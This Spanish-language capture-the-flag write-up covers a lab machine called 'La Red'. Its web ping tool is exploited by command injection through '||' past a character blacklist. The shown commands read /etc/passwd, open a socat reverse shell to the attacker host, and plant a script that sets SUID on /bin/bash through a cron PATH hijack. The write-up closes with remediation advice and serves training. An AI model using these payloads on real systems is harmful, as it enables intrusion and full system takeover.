# >_ [La Red]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | Whoami Labs |
| **Dificultad** | 🟡 Media  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.17.0.2` |
| **Fecha de resolución** | 2026-10-22 |

---

## 📝 Descripción
Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de tareas cron.

---

## 🔍 1. Fase de Reconocimiento y Enumeración

Comenzamos realizando un ping a la máquina y vemos que es un Linux
<img width="696" height="129" alt="ping" src="https://github.com/user-attachments/assets/6904cdd3-0a60-4eeb-a7a0-7fee2957ca3b" />
<br><br>

### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
 sudo nmap -p- --open -n -Pn 172.17.0.2 -oN allPorts
```

**Resultados del escaneo:**
* **Puerto 80/TCP**: HTTP


<img src="./img/1escaneo.png" width="70%">
<br>

### Enumeración de servicios
Continuamos con un escaneo más profundo del servicio encontrado:

```bash
nmap -p80 -sCV -n 172.17.0.2 -oN targeted
```


<img src="./img/2Escaneopuerto.png" width="70%">
<br>

Tenemos una página web creada con PHP 8.2.32, es una versión bastante reciente.


### Enumeración Web (Puerto 80)

Al inspeccionar el sitio web, nos encontramos con una página web llamada La Red, contiene una herramienta de diagnóstico en la que nos pide una dirección IP para ejecutar un ping desde el servidor.


<img src="./img/3web.png" width="90%">
<br>

Probamos a hacernos ping a nosotros mismos y funciona.

<img src="./img/4ping.png" width="70%">
<br>

Ahora vamos a probar a poner otro comando seguido para ver si nos lo ejecuta pero nos da error, nos dice que los caracteres no estan permitidos, así que no acepta el ;

<img src="./img/4probando.png" width="70%">
<br><br>


Vamos a probar con diferentes operadores de shell para comprobar si podemos encadenar instrucciones, hasta que descubrimos que el || si nos lo acepta y podemos ver el resultado de un ls, por lo que es vulnerable a inyección de comandos.
<img width="1426" height="919" alt="5lared" src="https://github.com/user-attachments/assets/2c0ef4f0-d9d8-4541-8d6a-203e9abfc223" />
<br><br>


---

## 💥 2. Fase de Explotación (Acceso Inicial)

Ya que podemos ejecutar comandos, vamos a leer el fichero index.php y vemos que tiene una lista negra con todos los caracteres que no permite: &,;,`,$,(,),{,}
La aplicación intenta filtrar determinados caracteres, pero no implementa una sanitización adecuada de la entrada y esto nos permite utilizar operadores no contemplados por la lista negra para alterar el comportamiento del comando.


<img width="1355" height="954" alt="6blacklist" src="https://github.com/user-attachments/assets/ce10cc47-bba6-42b4-a06a-ba411b5f169d" />
<br><br>

Leemos el archivo /etc/passwd para identificar las cuentas que existen y localizar posibles usuarios de los que podamos aprovecharnos. Encontramos las cuentas del sistema y el usuario root.


<img width="1262" height="956" alt="7passwd" src="https://github.com/user-attachments/assets/babc8dca-115b-4ff5-9cce-d5c51828fe71" />
<br><br>

Miramos que usuario somos y vemos que ahora mismo nosotros somos el usuario www-data y necesitamos pasar a ser root.
<img width="1400" height="836" alt="7yo" src="https://github.com/user-attachments/assets/92cb7540-15ec-4380-8f47-e08ef5d6a2c9" />
<br><br>


### Vector de Ataque

Tenemos dos opciones para escalar privilegios, una por la página web, aunque es un poco más incómodo y otra realizando una reverse shell y escalando por la terminal.


```bash
127.0.0. || find / -perm -4000 2>/dev/null
```

Vamos a analizar posibles vectores para escalar privilegios desde la herramienta de la página web, lanzamos un find perm pero no vemos nada útil.


<img width="1349" height="764" alt="8perm" src="https://github.com/user-attachments/assets/bffb5dab-750a-4a9f-a99f-e4abd1dd6a3e" />
<br><br>
Vamos a mirar a ver si tiene tareas cron.
El archivo /etc/crontab es el planificador de tareas global de Linux. Permite definir cuándo se ejecutan comandos automáticamente y bajo qué usuario.
<img width="1349" height="936" alt="10crontab" src="https://github.com/user-attachments/assets/9b131993-87ca-46a5-b5f4-570313424a47" />
<br><br>

El archivo /etc/crontab en Linux es un archivo de configuración que permite programar tareas automáticas del sistema para que se ejecuten en momentos específicos: cada hora, cada día, cada semana o cada mes.
<img width="1434" height="901" alt="11cron" src="https://github.com/user-attachments/assets/6e6abbf5-4eac-489a-b8d1-2c5786441d9a" />
<br><br>

Miramos que contiene ese fichero cleanup y también vamos a mirar que permisos tiene.
<img width="1438" height="864" alt="cleanup" src="https://github.com/user-attachments/assets/81b4167c-f70c-45d7-a167-e376a5da64ae" />
<img width="1355" height="916" alt="permisoscleanup" src="https://github.com/user-attachments/assets/b120df1d-aa4e-42e0-a594-da59ad6788d9" />
<br><br>

127.0.0. || echo "#!/bin/bash" > uploads/cleanup.sh
127.0.0. || chmod +x uploads/cleanup.sh 
127.0.0. || echo 'chmod u+s' >> uploads/cleanup.sh

127.0.0. || echo 'chmod u+s /bin/bash' >> uploads/cleanup.sh

Vamos a proceder a realizar una reverse shell para poder trabajar más comodamente.


### Intrusión (Reverse Shell)
Establecemos una *reverse shell* hacia nuestra máquina atacante:

```php
# Comando ejecutado en el navegador web
127.0.0. || socat TCP:172.17.0.1:440 exec:/bin/bash
```
<img width="1436" height="904" alt="revel" src="https://github.com/user-attachments/assets/13f6b506-7ae6-470e-bd11-2cf366601985" />
<br><br>


Ponemos nuestro *netcat* a la escucha para recibir la conexión:
```bash
sudo nc -lvnp 440
```

<img width="723" height="88" alt="nc" src="https://github.com/user-attachments/assets/1dc57619-3557-4fcb-bff1-31912973d5ea" />
<br><br>

Ya somos el usuario www-data desde una terminal, ahora podemos sanitizarla o continuar usandola tal y como está.

```bash
# Tratamiento de  la TTY para tener una consola interactiva cómoda
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```


## 👑 3. Escalada de Privilegios

### Enumeración del Sistema

Revisamos las tareas cron
<img width="1716" height="503" alt="establecido" src="https://github.com/user-attachments/assets/b4d33ec9-659b-4fdd-a412-438532918088" />
<br><br>

La variable PATH define los directorios donde el sistema busca los ejecutables cuando se introduce un comando sin especificar su ruta completa. Vemos que primero busca en la carpeta de uploads por lo que nos aprovecharemos de que podemos escribir dentro de esa carpeta y primero buscará ahi cleanup.

<img width="785" height="239" alt="revisar" src="https://github.com/user-attachments/assets/c19c3461-39f8-4d3c-b834-0c92cfef203b" />
<br><br>

---

### Explotación del Vector de Escalada

Como ya le dimos permisos a la bash, ejecutamos /bin/bash -p para convertirnos en root.
<img width="213" height="89" alt="1" src="https://github.com/user-attachments/assets/2728044c-16f7-476b-98ec-faef36635cb8" />
<br><br>

¡Ya somos *root*! Buscamos el fichero que contiene la flag en la carpeta personal de root.

<img width="403" height="155" alt="2" src="https://github.com/user-attachments/assets/b9d611cb-3a2d-49ef-a81f-e24ef0cf4b9f" />
<br><br>

Por último, validamos la flag obtenida.

<img width="795" height="450" alt="3" src="https://github.com/user-attachments/assets/0544039d-0c31-4ea5-97da-edbeabd7c177" />
<br><br>

## 🧠 4. Conclusiones

Durante la resolución de esta máquina hemos identificado
una vulnerabilidad de ejecución de comandos en una
aplicación web que permite ejecutar instrucciones
arbitrarias en el sistema.

La explotación ha permitido obtener acceso inicial
con los privilegios del servicio web.

Posteriormente, mediante la enumeración de los permisos
del usuario y la identificación de configuraciones
inseguras, hemos conseguido escalar privilegios hasta root.

### Vulnerabilidades identificadas

- Command Injection en la herramienta de diagnóstico.
- Uso de una lista negra insuficiente para filtrar entradas.
- Configuración insegura de privilegios.

### Recomendaciones de seguridad

- Evitar construir comandos del sistema concatenando
  entradas proporcionadas por usuarios.
- Utilizar funciones nativas del lenguaje cuando sea posible.
- Aplicar validación mediante listas de valores permitidos.
- Revisar periódicamente los permisos sudo.
- Aplicar el principio de mínimo privilegio.
